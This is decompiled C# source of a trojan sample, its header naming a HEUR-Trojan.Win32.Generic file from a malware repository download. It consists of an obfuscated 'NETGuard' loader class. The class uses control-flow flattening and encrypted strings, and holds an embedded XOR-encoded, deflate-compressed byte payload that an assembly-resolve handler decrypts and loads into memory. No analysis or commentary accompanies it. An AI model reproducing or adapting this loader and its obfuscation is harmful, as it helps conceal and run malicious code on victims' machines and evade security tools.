// Decompiled with JetBrains decompiler
// Type: NETGuard
// Assembly: ClassLibrary1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BD89B5FB-ADA3-4778-A6F3-2882B72918D5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-0dfff5bbf6b08a68798117e7f9126d0fd9715dc6cd2b40a4e027d54f911ad0aa.exe

using ClassLibrary1;
using ClassLibrary1.Properties;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security;
using System.Text;

internal sealed class NETGuard : Attribute
{
  internal static NETGuard.Ⴗ \u003131;
  private static readonly Array \u003131;
  private static readonly Array \u003131 = (Array) new char[8]
  {
    '윕',
    '윐',
    '윕',
    '\uEEA7',
    '\uDFAD',
    '틃',
    'ﶤ',
    '퇜'
  };
  private static readonly Array \u003131;
  internal static NETGuard.Ⴄ \u003131;

  public NETGuard([In] string obj0)
  {
  }

  [SecuritySafeCritical]
  static NETGuard()
  {
    char[] chArray = new char[8]
    {
      char.MinValue,
      '⦆',
      char.MinValue,
      char.MinValue,
      char.MinValue,
      char.MinValue,
      char.MinValue,
      'ᗥ'
    };
    chArray[4] = '㷋';
    chArray[2] = 'ⴊ';
    chArray[5] = 'ᛤ';
    chArray[3] = '\u2E65';
    chArray[0] = '\u18FD';
    chArray[6] = '㫷';
    NETGuard.\u003131 = (Array) new string[1];
    NETGuard.\u003131 = (Array) chArray;
    ResourceHelper\u002EThrowKeyNotFoundException.gpVIIatD();
  }

  internal static Assembly clalBwTZ([In] object obj0, [In] ResolveEventArgs obj1) => (Assembly) NETGuard.xevpPPze(typeof (ISectionEntry\u002EHandleWorkRequest), "d010a4b5-54b6-4792-816f-61d72c328f80", (object) obj1, 604, 48, 7);

  internal static object xevpPPze(
    [In] Type obj0,
    [In] string obj1,
    [In] object obj2,
    [In] int obj3,
    [In] int obj4,
    [In] int obj5)
  {
    char[] chArray1 = IllogicalCallContext\u002EGetAssemblyEnumerator.\u003131;
    char[] chArray2 = IBindCtx\u002ECreateIterator.\u003131;
label_3:
    while (obj3 > 0)
    {
      int num1 = 8;
      EventArgs eventArgs;
      object name;
      object obj6;
      object obj7;
      object buffer;
      int index1;
      while (true)
      {
        switch (num1)
        {
          case 0:
            index1 = obj3 - 1;
            num1 = 7;
            continue;
          case 1:
            name = (object) LocalDataStoreMgr\u002Eget_DefaultIcon.UqHtzobq<string, string>(obj1, NETGuard.IQdujANL(8, 12, 1605896574), 'ɥ', 'ȶ');
            num1 = (int) chArray2[369] - 14405;
            continue;
          case 2:
            goto label_17;
          case 3:
          case 4:
            buffer = (object) new byte[604]
            {
              (byte) 193,
              (byte) 126,
              (byte) 97,
              (byte) 68,
              (byte) 35,
              (byte) 112,
              (byte) 38,
              (byte) 76,
              (byte) 175,
              (byte) 109,
              (byte) 191,
              (byte) 226,
              (byte) 46,
              (byte) 120,
              (byte) 198,
              (byte) 72,
              (byte) 79,
              (byte) 175,
              (byte) 214,
              (byte) 18,
              (byte) 108,
              (byte) 40,
              (byte) 40,
              (byte) 15,
              (byte) 79,
              (byte) 3,
              (byte) 148,
              (byte) 99,
              (byte) 42,
              (byte) 235,
              (byte) 67,
              (byte) 70,
              (byte) 5,
              (byte) 231,
              (byte) 236,
              (byte) 47,
              (byte) 227,
              (byte) 136,
              (byte) 47,
              (byte) 151,
              (byte) 149,
              (byte) 152,
              (byte) 58,
              (byte) 207,
              (byte) 133,
              (byte) 116,
              (byte) 83,
              (byte) 19,
              (byte) 77,
              (byte) 28,
              (byte) 226,
              (byte) 54,
              (byte) 107,
              byte.MaxValue,
              (byte) 94,
              (byte) 138,
              (byte) 161,
              (byte) 106,
              (byte) 70,
              (byte) 90,
              (byte) 124,
              (byte) 120,
              (byte) 85,
              (byte) 235,
              (byte) 60,
              (byte) 66,
              (byte) 16,
              (byte) 110,
              (byte) 141,
              (byte) 117,
              (byte) 172,
              (byte) 78,
              (byte) 108,
              (byte) 18,
              (byte) 1,
              (byte) 132,
              (byte) 71,
              (byte) 219,
              (byte) 63,
              (byte) 235,
              (byte) 34,
              (byte) 135,
              (byte) 165,
              (byte) 2,
              (byte) 115,
              (byte) 231,
              (byte) 252,
              (byte) 120,
              (byte) 114,
              (byte) 72,
              (byte) 233,
              (byte) 89,
              (byte) 54,
              (byte) 164,
              (byte) 84,
              (byte) 86,
              (byte) 142,
              (byte) 178,
              (byte) 142,
              (byte) 147,
              (byte) 129,
              (byte) 71,
              (byte) 127,
              (byte) 145,
              (byte) 120,
              (byte) 23,
              (byte) 17,
              (byte) 131,
              (byte) 100,
              (byte) 132,
              (byte) 21,
              (byte) 30,
              (byte) 81,
              (byte) 2,
              (byte) 225,
              (byte) 160,
              (byte) 175,
              (byte) 154,
              (byte) 101,
              (byte) 85,
              (byte) 38,
              (byte) 30,
              (byte) 244,
              (byte) 198,
              (byte) 135,
              (byte) 241,
              (byte) 215,
              (byte) 235,
              (byte) 225,
              (byte) 127,
              (byte) 76,
              (byte) 233,
              (byte) 51,
              (byte) 154,
              byte.MaxValue,
              (byte) 17,
              (byte) 158,
              (byte) 57,
              (byte) 175,
              (byte) 161,
              (byte) 17,
              (byte) 154,
              (byte) 91,
              (byte) 141,
              (byte) 159,
              (byte) 41,
              (byte) 47,
              (byte) 83,
              (byte) 170,
              (byte) 68,
              (byte) 246,
              (byte) 206,
              (byte) 201,
              (byte) 32,
              (byte) 127,
              (byte) 126,
              (byte) 17,
              (byte) 194,
              (byte) 119,
              (byte) 215,
              (byte) 105,
              (byte) 166,
              (byte) 206,
              (byte) 202,
              (byte) 25,
              (byte) 214,
              (byte) 93,
              (byte) 157,
              (byte) 11,
              (byte) 106,
              (byte) 11,
              (byte) 24,
              (byte) 35,
              (byte) 204,
              (byte) 166,
              (byte) 26,
              (byte) 63,
              (byte) 143,
              (byte) 30,
              (byte) 204,
              (byte) 5,
              (byte) 18,
              (byte) 90,
              (byte) 4,
              (byte) 197,
              (byte) 212,
              (byte) 118,
              (byte) 153,
              (byte) 172,
              (byte) 35,
              (byte) 113,
              (byte) 16,
              (byte) 80,
              (byte) 253,
              (byte) 110,
              (byte) 78,
              (byte) 119,
              (byte) 43,
              (byte) 2,
              (byte) 238,
              (byte) 203,
              (byte) 81,
              (byte) 104,
              (byte) 245,
              (byte) 100,
              (byte) 141,
              (byte) 21,
              (byte) 90,
              (byte) 227,
              (byte) 197,
              (byte) 233,
              (byte) 180,
              (byte) 34,
              (byte) 110,
              (byte) 231,
              (byte) 76,
              (byte) 131,
              (byte) 17,
              (byte) 93,
              (byte) 154,
              (byte) 208,
              (byte) 78,
              (byte) 39,
              (byte) 173,
              (byte) 44,
              (byte) 249,
              (byte) 11,
              (byte) 73,
              (byte) 134,
              (byte) 16,
              (byte) 163,
              (byte) 221,
              (byte) 153,
              (byte) 185,
              (byte) 115,
              (byte) 28,
              (byte) 195,
              (byte) 143,
              (byte) 234,
              (byte) 52,
              (byte) 97,
              (byte) 67,
              (byte) 242,
              (byte) 247,
              (byte) 121,
              (byte) 102,
              (byte) 112,
              (byte) 247,
              (byte) 64,
              (byte) 171,
              (byte) 156,
              (byte) 134,
              (byte) 222,
              (byte) 29,
              (byte) 142,
              (byte) 81,
              (byte) 29,
              (byte) 106,
              (byte) 137,
              (byte) 11,
              (byte) 150,
              (byte) 206,
              (byte) 119,
              (byte) 145,
              (byte) 183,
              (byte) 99,
              (byte) 254,
              (byte) 196,
              (byte) 1,
              (byte) 14,
              (byte) 207,
              (byte) 55,
              (byte) 56,
              (byte) 191,
              (byte) 62,
              (byte) 110,
              (byte) 73,
              (byte) 157,
              (byte) 220,
              (byte) 51,
              (byte) 20,
              (byte) 103,
              (byte) 133,
              (byte) 217,
              (byte) 144,
              (byte) 70,
              (byte) 60,
              (byte) 207,
              (byte) 49,
              (byte) 179,
              (byte) 186,
              (byte) 178,
              (byte) 243,
              (byte) 25,
              (byte) 83,
              (byte) 136,
              (byte) 150,
              (byte) 161,
              (byte) 28,
              (byte) 144,
              (byte) 236,
              (byte) 233,
              (byte) 115,
              (byte) 204,
              (byte) 141,
              (byte) 105,
              (byte) 50,
              (byte) 241,
              (byte) 194,
              (byte) 88,
              (byte) 250,
              (byte) 246,
              (byte) 53,
              (byte) 180,
              (byte) 246,
              (byte) 32,
              (byte) 32,
              (byte) 186,
              (byte) 62,
              (byte) 102,
              (byte) 194,
              (byte) 190,
              (byte) 20,
              (byte) 235,
              (byte) 172,
              (byte) 51,
              (byte) 28,
              (byte) 33,
              (byte) 247,
              (byte) 80,
              (byte) 21,
              (byte) 5,
              (byte) 172,
              (byte) 192,
              (byte) 88,
              (byte) 95,
              (byte) 31,
              (byte) 150,
              (byte) 232,
              (byte) 178,
              (byte) 177,
              (byte) 72,
              (byte) 82,
              (byte) 53,
              (byte) 60,
              (byte) 39,
              (byte) 193,
              (byte) 207,
              (byte) 65,
              (byte) 39,
              (byte) 97,
              (byte) 223,
              (byte) 49,
              (byte) 4,
              (byte) 19,
              (byte) 37,
              (byte) 97,
              (byte) 129,
              (byte) 203,
              (byte) 33,
              (byte) 10,
              (byte) 221,
              (byte) 190,
              (byte) 230,
              (byte) 173,
              (byte) 231,
              (byte) 227,
              (byte) 250,
              (byte) 229,
              (byte) 108,
              (byte) 140,
              (byte) 217,
              (byte) 55,
              (byte) 55,
              (byte) 97,
              (byte) 112,
              (byte) 63,
              (byte) 124,
              (byte) 106,
              (byte) 5,
              (byte) 229,
              (byte) 69,
              (byte) 185,
              (byte) 190,
              (byte) 24,
              (byte) 235,
              (byte) 197,
              (byte) 243,
              (byte) 234,
              (byte) 120,
              (byte) 136,
              (byte) 4,
              (byte) 23,
              (byte) 140,
              (byte) 235,
              (byte) 14,
              (byte) 41,
              (byte) 47,
              (byte) 250,
              (byte) 201,
              (byte) 213,
              (byte) 26,
              (byte) 104,
              (byte) 164,
              (byte) 78,
              (byte) 73,
              (byte) 186,
              (byte) 247,
              (byte) 213,
              (byte) 142,
              (byte) 254,
              (byte) 75,
              (byte) 215,
              (byte) 39,
              (byte) 66,
              (byte) 154,
              (byte) 223,
              (byte) 219,
              (byte) 16,
              (byte) 203,
              (byte) 40,
              (byte) 1,
              (byte) 77,
              (byte) 132,
              (byte) 248,
              (byte) 155,
              (byte) 143,
              (byte) 20,
              (byte) 172,
              (byte) 251,
              (byte) 82,
              (byte) 63,
              (byte) 41,
              (byte) 136,
              (byte) 38,
              (byte) 37,
              (byte) 186,
              (byte) 223,
              (byte) 217,
              (byte) 178,
              (byte) 247,
              (byte) 84,
              (byte) 3,
              (byte) 11,
              (byte) 100,
              (byte) 25,
              (byte) 120,
              (byte) 120,
              (byte) 18,
              (byte) 106,
              (byte) 90,
              (byte) 231,
              (byte) 151,
              (byte) 49,
              (byte) 47,
              (byte) 154,
              (byte) 32,
              (byte) 105,
              (byte) 167,
              (byte) 237,
              (byte) 68,
              (byte) 136,
              (byte) 149,
              (byte) 119,
              (byte) 109,
              (byte) 59,
              (byte) 76,
              (byte) 98,
              (byte) 234,
              (byte) 120,
              (byte) 133,
              (byte) 62,
              (byte) 239,
              (byte) 72,
              (byte) 53,
              (byte) 189,
              (byte) 106,
              (byte) 147,
              (byte) 15,
              (byte) 81,
              (byte) 235,
              (byte) 7,
              (byte) 225,
              (byte) 35,
              (byte) 216,
              (byte) 201,
              (byte) 84,
              (byte) 235,
              (byte) 226,
              (byte) 241,
              (byte) 227,
              (byte) 19,
              (byte) 67,
              (byte) 251,
              (byte) 92,
              (byte) 16,
              (byte) 165,
              (byte) 88,
              (byte) 91,
              (byte) 78,
              (byte) 210,
              (byte) 109,
              (byte) 225,
              (byte) 85,
              (byte) 125,
              (byte) 68,
              (byte) 43,
              (byte) 179,
              (byte) 131,
              (byte) 239,
              (byte) 112,
              (byte) 96,
              (byte) 252,
              (byte) 6,
              (byte) 136,
              (byte) 101,
              (byte) 89,
              (byte) 175,
              (byte) 95,
              (byte) 27,
              (byte) 168,
              (byte) 31,
              (byte) 250,
              (byte) 37,
              (byte) 5,
              (byte) 238,
              (byte) 145,
              (byte) 36,
              (byte) 96,
              (byte) 20,
              (byte) 36,
              (byte) 165,
              (byte) 237,
              (byte) 162,
              (byte) 23,
              (byte) 27,
              (byte) 57,
              (byte) 182,
              (byte) 232,
              (byte) 182,
              (byte) 59,
              (byte) 168,
              (byte) 15,
              (byte) 165,
              (byte) 161,
              (byte) 254,
              (byte) 61,
              (byte) 148,
              (byte) 15,
              (byte) 135,
              (byte) 13,
              (byte) 58,
              (byte) 225,
              (byte) 133,
              (byte) 6,
              (byte) 134,
              (byte) 190,
              (byte) 129,
              (byte) 229,
              (byte) 98,
              (byte) 210,
              (byte) 11,
              (byte) 54,
              (byte) 205,
              (byte) 57,
              (byte) 174,
              (byte) 122,
              (byte) 95,
              (byte) 207,
              (byte) 142,
              (byte) 35,
              (byte) 226,
              (byte) 90,
              (byte) 25,
              (byte) 213,
              (byte) 86,
              (byte) 206,
              (byte) 193,
              (byte) 135,
              (byte) 213,
              (byte) 139,
              (byte) 221,
              (byte) 9,
              (byte) 98,
              (byte) 60,
              (byte) 159,
              (byte) 129,
              (byte) 254,
              (byte) 118,
              (byte) 136,
              (byte) 5,
              (byte) 59,
              (byte) 192,
              (byte) 3,
              (byte) 161,
              (byte) 245,
              (byte) 157,
              (byte) 53,
              (byte) 18,
              (byte) 192,
              (byte) 152,
              (byte) 129,
              (byte) 248,
              (byte) 134
            };
            num1 = (int) chArray2[45] - 17312;
            continue;
          case 5:
            --index1;
            num1 = 7;
            continue;
          case 6:
          case 12:
            (buffer as byte[])[index1] ^= (byte) (index1 + obj3 - obj4 & (int) byte.MaxValue);
            num1 = 5;
            continue;
          case 7:
            num1 = index1 >= 0 ? 12 : 2;
            continue;
          case 8:
            _Assembly assembly = (_Assembly) IndexRange\u002EToUpperAsciiInvariant.ohyolvMI((short) 330, 'ź');
            eventArgs = (EventArgs) obj2;
            num1 = !ResourceHelper\u002EThrowKeyNotFoundException.ulNMWJIN<Assembly, Assembly>(LocalDataStoreMgr\u002Eget_DefaultIcon.rKKPjerf<ResolveEventArgs>((ResolveEventArgs) eventArgs, (short) 495, (short) 416), assembly as Assembly, 861, '̟') ? 1 : 14;
            continue;
          case 9:
          case 10:
            obj6 = (object) NETGuard.xleXylJy((short) 179, 170);
            obj7 = (object) (Dictionary<string, string>) NETGuard.gfcFcTca<AppDomain, string>(obj6 as AppDomain, obj1, '˵', 738);
            num1 = 11;
            continue;
          case 11:
            if (!(obj7 is Dictionary<string, string>))
            {
              num1 = 16;
              continue;
            }
            goto label_37;
          case 13:
            goto label_3;
          case 14:
            goto label_6;
          case 16:
            obj7 = (object) new Dictionary<string, string>();
            NETGuard.fIZLUqdn<AppDomain, string, object>(obj6 as AppDomain, obj1, (object) (Dictionary<string, string>) obj7, (short) 721, 643);
            num1 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (NETGuard.xevpPPze);
            num1 = 13;
            continue;
        }
      }
label_6:
      return (object) null;
label_17:
      IDisposable disposable = (IDisposable) new MemoryStream();
      object obj8 = (object) new DeflateStream((Stream) new MemoryStream((byte[]) buffer), CompressionMode.Decompress, true);
      try
      {
        int num2 = 6;
        Array array;
        int num3;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
            case 5:
              NETGuard.YMGdOOwR<Stream>((Stream) disposable, (byte[]) array, 0, num3, (short) 537, (short) 596);
              goto case 1;
            case 1:
            case 7:
              num2 = (num3 = NETGuard.DEcjlIcT<Stream>(obj8 as Stream, (byte[]) array, 0, (array as byte[]).Length, 848, 'Ͱ')) > 0 ? 0 : 4;
              continue;
            case 4:
              goto label_28;
            default:
              array = (Array) new byte[1024];
              num2 = 1;
              continue;
          }
        }
      }
      finally
      {
        int num4 = 4;
        while (true)
        {
          switch (num4)
          {
            case 2:
            case 5:
              goto label_27;
            case 3:
            case 6:
              goto label_26;
            default:
              num4 = !(obj8 is Stream) ? (int) chArray2[221] - 38549 : 6;
              continue;
          }
        }
label_26:
        ((IDisposable) obj8).Dispose();
label_27:;
      }
label_28:
      int num5 = 1;
label_29:
      ISerializable serializable;
      object obj9;
      int index2;
      while (true)
      {
        switch (num5)
        {
          case 0:
            num5 = (int) chArray1[235] - 14589;
            continue;
          case 2:
          case 4:
            ++index2;
            num5 = 5;
            continue;
          case 3:
            object key = (object) (obj9 as string[])[index2];
            (obj7 as Dictionary<string, string>)[key as string] = key as string;
            num5 = 4;
            continue;
          case 5:
          case 10:
            num5 = index2 < (obj9 as string[]).Length ? 3 : 0;
            continue;
          case 6:
            num5 = !(obj7 as Dictionary<string, string>).ContainsKey((eventArgs as ResolveEventArgs).Name) ? (int) chArray1[17] - 34115 : 9;
            continue;
          case 8:
            NETGuard.fIZLUqdn<AppDomain, string, object>(obj6 as AppDomain, (string) name, (object) (Assembly) serializable, (short) 822, 868);
            num5 = (int) chArray1[168] - 61917;
            continue;
          case 9:
            goto label_39;
          case 12:
            goto label_40;
          case 13:
            goto label_37;
          case 14:
            obj9 = (object) LocalDataStoreMgr\u002Eget_DefaultIcon.QCcopnJp<Assembly>(serializable as Assembly, (short) 391, (short) 476);
            index2 = 0;
            num5 = 5;
            continue;
          default:
            serializable = (ISerializable) IntroducedMethodEnumerator\u002ERead.cxiVqyrn(NETGuard.MItmEDQw<MemoryStream>((MemoryStream) disposable, (short) 968, 'Ώ'), (byte[]) null, SecurityContextSource.CurrentAssembly, (short) 417, (short) 444);
            num5 = 8;
            continue;
        }
      }
label_39:
      return (object) (serializable as Assembly);
label_37:
      serializable = (ISerializable) ((AppDomain) obj6).GetData(name as string);
      num5 = 6;
      goto label_29;
    }
label_40:
    return (object) null;
  }

  internal static string IQdujANL([In] int obj0, [In] int obj1, [In] int obj2)
  {
    char[] chArray1 = IllogicalCallContext\u002EGetAssemblyEnumerator.\u003131;
    char[] chArray2 = IBindCtx\u002ECreateIterator.\u003131;
label_3:
    int index1 = obj2 ^ 1605896566 ^ obj0;
    object obj3 = (object) NETGuard.\u003131;
    char[] chArray3 = (char[]) obj3;
    int num1 = (int) chArray3[index1];
    int index2 = (int) chArray3[index1 + 2] ^ num1;
    int num2 = 8;
    object obj4;
    int index3;
    Array array1;
    Array array2;
    ISerializable serializable;
    char ch;
    int num3;
    int num4;
    int length;
    int num5;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num4 = num4 << 15 | (int) ((char[]) array2)[index3++] ^ (int) ch;
          num2 = (int) chArray1[225] - 33635;
          continue;
        case 1:
          length = ((char[]) array1).Length;
          num5 = 1;
          num2 = (int) chArray2[309] - 37784;
          continue;
        case 2:
          obj4 = (object) (serializable as StringBuilder).ToString();
          ((string[]) NETGuard.\u003131)[index2] = obj4 as string;
          num2 = (int) chArray2[309] - 37778;
          continue;
        case 3:
          num3 = (int) ((char[]) array2)[index3 + 1] ^ (int) ch;
          num2 = 5;
          continue;
        case 4:
          ++num5;
          num2 = 7;
          continue;
        case 5:
          index3 += 3;
          goto case 10;
        case 6:
        case 9:
          char[] chArray4 = (char[]) obj3;
          char[] chArray5 = (char[]) NETGuard.\u003131;
          index3 = index1;
          array1 = (Array) chArray5;
          array2 = (Array) chArray4;
          num2 = 17;
          continue;
        case 7:
          num2 = num5 <= num4 ? 11 : 2;
          continue;
        case 8:
          num2 = (string) (obj4 = (object) ((string[]) NETGuard.\u003131)[index2]) == null ? 6 : (int) chArray1[210] - 28846;
          continue;
        case 10:
          num4 = num3 & 31 | (num3 & 65472) >> 1;
          num2 = (int) chArray1[78] - 36702;
          continue;
        case 11:
          ((StringBuilder) serializable).Append((char) ((uint) ch ^ (uint) (array2 as char[])[index3 + num4 - num5] ^ (uint) (array1 as char[])[(num5 + index3 + 17) % length]));
          num2 = (int) chArray1[294] - 24798;
          continue;
        case 13:
          goto label_18;
        case 14:
          goto label_5;
        case 15:
          goto label_3;
        case 16:
          int num6 = num3;
          IBindCtx\u002ECreateIterator.\u003131[257] = (char) ((int) IBindCtx\u002ECreateIterator.\u003131[257] + obj2 & 126);
          num2 = (num6 & 32) == 0 ? (int) chArray2[14] - 9881 : (int) chArray2[370] - 44714;
          continue;
        case 17:
          serializable = (ISerializable) new StringBuilder();
          ch = (array2 as char[])[index3];
          goto case 3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (NETGuard.IQdujANL);
          num2 = 15;
          continue;
      }
    }
label_5:
    return (string) obj4;
label_18:
    return obj4 as string;
  }

  [SecuritySafeCritical]
  internal static AppDomain xleXylJy([In] short obj0, [In] int obj1)
  {
    char[] chArray1 = IllogicalCallContext\u002EGetAssemblyEnumerator.\u003131;
    char[] chArray2 = IBindCtx\u002ECreateIterator.\u003131;
label_3:
    int num1 = 0;
    int num2 = (int) chArray1[139] - 3441;
    object obj;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 4:
        case 11:
          int num4;
          switch (((int) obj0 ^ obj1) - 25 ^ num1)
          {
            case 0:
              num4 = 1;
              break;
            default:
              num4 = 3;
              break;
          }
          num2 = num4;
          continue;
        case 1:
          obj = (object) AppDomain.CurrentDomain;
          num2 = 6;
          continue;
        case 3:
          obj = (object) null;
          num2 = 6;
          continue;
        case 5:
          num2 = num3 % 2 != 0 ? (int) chArray2[434] - 65303 : 8;
          continue;
        case 6:
          ++num1;
          int num5 = (int) obj0;
          int num6 = num5 * num5;
          num3 = (int) obj0 + num6;
          num2 = (int) chArray1[74] - 51537;
          continue;
        case 7:
          goto label_3;
        case 8:
          goto label_12;
        case 9:
          num2 = 0;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (NETGuard.xleXylJy);
          num2 = (int) chArray1[153] - 41340;
          continue;
      }
    }
label_12:
    return obj as AppDomain;
  }

  [SecuritySafeCritical]
  internal static object gfcFcTca<\u0021\u00210, \u0021\u00211>(
    [In] \u0021\u00210 obj0,
    [In] \u0021\u00211 obj1,
    [In] char obj2,
    [In] int obj3)
    where \u0021\u00210 : AppDomain
    where \u0021\u00211 : string
  {
    char[] chArray1 = IBindCtx\u002ECreateIterator.\u003131;
    char[] chArray2 = IllogicalCallContext\u002EGetAssemblyEnumerator.\u003131;
label_3:
    int num1 = 0;
    int num2 = (int) chArray1[223] - 59386;
    object obj;
    while (true)
    {
      switch (num2)
      {
        case 0:
          obj = (object) null;
          num2 = (int) chArray2[(int) byte.MaxValue] - 5382;
          continue;
        case 1:
          num2 = (int) chArray1[245] - 9274;
          continue;
        case 3:
          goto label_3;
        case 4:
          goto label_13;
        case 5:
        case 8:
          ++num1;
          goto case 7;
        case 6:
          obj = obj0.GetData((string) obj1);
          num2 = (int) chArray1[459] - 44277;
          continue;
        case 7:
          num2 = 2891 > 413 - 290 * 7 ? 4 : (int) chArray2[32] - 62958;
          continue;
        case 9:
          int num3;
          switch ((obj3 ^ (int) obj2) - 23 ^ num1)
          {
            case 0:
              num3 = (int) chArray2[56] - 36790;
              break;
            default:
              num3 = (int) chArray2[44] - (int) chArray2[44];
              break;
          }
          num2 = num3;
          continue;
        case 10:
        case 11:
          num2 = 9;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (NETGuard.gfcFcTca);
          num2 = 3;
          continue;
      }
    }
label_13:
    return obj;
  }

  [SecuritySafeCritical]
  internal static void fIZLUqdn<\u0021\u00210, \u0021\u00211, \u0021\u00212>(
    [In] \u0021\u00210 obj0,
    [In] \u0021\u00211 obj1,
    [In] \u0021\u00212 obj2,
    [In] short obj3,
    [In] int obj4)
    where \u0021\u00210 : AppDomain
    where \u0021\u00211 : string
    where \u0021\u00212 : object
  {
    char[] chArray = IBindCtx\u002ECreateIterator.\u003131;
    int num1 = 5;
    int num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 2:
          ++num2;
          int num3 = 934 - 736 * 10;
          IllogicalCallContext\u002EGetAssemblyEnumerator.\u003131[34] = (char) (((int) IllogicalCallContext\u002EGetAssemblyEnumerator.\u003131[34] ^ (int) obj3) & 58);
          num1 = 9340 > num3 ? 4 : 3;
          continue;
        case 1:
          int num4;
          switch (((int) obj3 ^ obj4) - 82 ^ num2)
          {
            case 0:
              num4 = (int) chArray[168] - 62583;
              break;
            default:
              num4 = 6;
              break;
          }
          num1 = num4;
          continue;
        case 3:
        case 8:
          num1 = 1;
          continue;
        case 4:
          goto label_11;
        case 6:
          num1 = (int) chArray[244] - 33475;
          continue;
        case 7:
        case 9:
          obj0.SetData((string) obj1, (object) obj2);
          goto case 0;
        default:
          num2 = 0;
          num1 = 1;
          continue;
      }
    }
label_11:;
  }

  [SecuritySafeCritical]
  internal static void YMGdOOwR<\u0021\u00210>(
    [In] \u0021\u00210 obj0,
    [In] byte[] obj1,
    [In] int obj2,
    [In] int obj3,
    [In] short obj4,
    [In] short obj5)
    where \u0021\u00210 : Stream
  {
    char[] chArray = IBindCtx\u002ECreateIterator.\u003131;
    int num1 = 7;
    int num2;
    int num3;
    while (true)
    {
      switch (num1)
      {
        case 0:
          num1 = num3 % 2 != 0 ? 6 : 5;
          continue;
        case 1:
          obj0.Write(obj1, obj2, obj3);
          goto case 9;
        case 2:
          num3 = (int) obj4 + num3;
          num1 = (int) chArray[45] - 17312;
          continue;
        case 3:
          int num4 = (int) obj4;
          num3 = num4 * num4;
          goto case 2;
        case 4:
          num1 = (int) chArray[90] - 35240;
          continue;
        case 5:
          goto label_13;
        case 6:
          int num5;
          switch (((int) obj5 ^ (int) obj4) - 77 ^ num2)
          {
            case 0:
              num5 = 1;
              break;
            default:
              num5 = 4;
              break;
          }
          num1 = num5;
          continue;
        case 9:
          ++num2;
          goto case 3;
        default:
          num2 = 0;
          num1 = 6;
          continue;
      }
    }
label_13:;
  }

  [SecuritySafeCritical]
  internal static int DEcjlIcT<\u0021\u00210>(
    [In] \u0021\u00210 obj0,
    [In] byte[] obj1,
    [In] int obj2,
    [In] int obj3,
    [In] int obj4,
    [In] char obj5)
    where \u0021\u00210 : Stream
  {
    char[] chArray1 = IBindCtx\u002ECreateIterator.\u003131;
    char[] chArray2 = IllogicalCallContext\u002EGetAssemblyEnumerator.\u003131;
label_3:
    int num1 = 0;
    int num2 = 0;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 10:
          int num4;
          switch ((obj4 ^ (int) obj5) - 32 ^ num1)
          {
            case 0:
              num4 = (int) chArray2[85] - 55818;
              break;
            default:
              num4 = (int) chArray1[369] - 14411;
              break;
          }
          num2 = num4;
          continue;
        case 1:
          num3 = obj0.Read(obj1, obj2, obj3);
          num2 = 6;
          continue;
        case 2:
        case 11:
          goto label_12;
        case 3:
        case 9:
          num2 = (int) chArray2[233] - (int) chArray2[233];
          continue;
        case 4:
          num3 = obj4;
          num2 = 6;
          continue;
        case 5:
          goto label_3;
        case 6:
          ++num1;
          num2 = 804 > 268 - 20 * 3 ? 11 : 7;
          continue;
        case 7:
          num2 = 0;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (NETGuard.DEcjlIcT);
          num2 = 5;
          continue;
      }
    }
label_12:
    return num3;
  }

  [SecuritySafeCritical]
  internal static byte[] MItmEDQw<\u0021\u00210>([In] \u0021\u00210 obj0, [In] short obj1, [In] char obj2) where \u0021\u00210 : MemoryStream
  {
    char[] chArray = IllogicalCallContext\u002EGetAssemblyEnumerator.\u003131;
label_3:
    int num1 = 0;
    int num2 = 0;
    object obj;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          int num4;
          switch (((int) obj1 ^ (int) obj2) - 71 ^ num1)
          {
            case 0:
              num4 = 8;
              break;
            default:
              num4 = (int) chArray[9] - 12638;
              break;
          }
          num2 = num4;
          continue;
        case 1:
        case 4:
          ++num1;
          int num5 = (int) obj1;
          int num6 = num5 * num5;
          num3 = (int) obj1 + num6;
          num2 = (int) chArray[8] - 3429;
          continue;
        case 2:
        case 7:
          goto label_3;
        case 5:
        case 9:
          goto label_12;
        case 6:
          obj = (object) null;
          num2 = 4;
          continue;
        case 8:
          obj = (object) obj0.ToArray();
          num2 = 4;
          continue;
        case 10:
          num2 = num3 % 2 != 0 ? 0 : 9;
          continue;
        case 11:
          num2 = 0;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (NETGuard.MItmEDQw);
          num2 = (int) chArray[48] - 18935;
          continue;
      }
    }
label_12:
    return obj as byte[];
  }

  static string \u00322(double _param0, int _param1, int _param2, int _param3)
  {
    // ISSUE: unable to decompile the method.
  }

  [StructLayout(LayoutKind.Explicit, Size = 604, Pack = 1)]
  private struct Ⴗ
  {
  }

  [StructLayout(LayoutKind.Explicit, Size = 16, Pack = 1)]
  private struct Ⴄ
  {
  }
}
